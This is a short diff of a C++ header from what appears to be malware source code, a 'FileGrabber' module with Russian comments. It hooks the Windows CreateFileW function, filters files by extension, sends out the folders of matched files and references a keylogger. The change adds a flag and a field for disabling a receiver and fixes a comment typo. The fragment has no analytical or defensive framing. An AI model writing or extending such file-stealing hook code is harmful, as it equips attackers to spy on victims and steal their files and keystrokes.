@@ -42,11 +42,12 @@ namespace FileGrabber {
 	const int SENDFOLDER = 0x0100; //отсылает папку в которой находится найденный файл, имя папки для кейлогера заносим в nameSend
 	const int IGNOREHOOK = 0x0200; //игнорируем обработку хука
 	const int INHOOK = 0x0400; //идет обработка хука, все остальные файлы игнорируется на это время
+	const int STOPRECEIVER = 0x0800; //отключает получателя (необходимо если не нужно больше на него реагировать)
 
 	const int MaxIgnoreBeg = 4; //максимальное количество игнорируемых форматов
 	const int MaxLenIgnoreBeg = 4; //максимальная длина метки формата
 
-	//Получатель и услосвия сообщения о входе в функцию CreateFile
+	//Получатель и условия сообщения о входе в функцию CreateFile
 	struct Receiver
 	{
 		int id;
@@ -59,6 +60,7 @@ namespace FileGrabber {
 							  //расчет максимум на 4-е формата, конец массива считается пустая строка (ignoreBeg[n][0] == 0)
 		DWORD* ignoreExt; //игнорируемые расширения
 		DWORD* neededExt; //нужные расширения
+		bool ignore; //true - если нужно игнорировать этого получателя
 	};
 
 	typedef HANDLE (WINAPI *TypeCreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess,
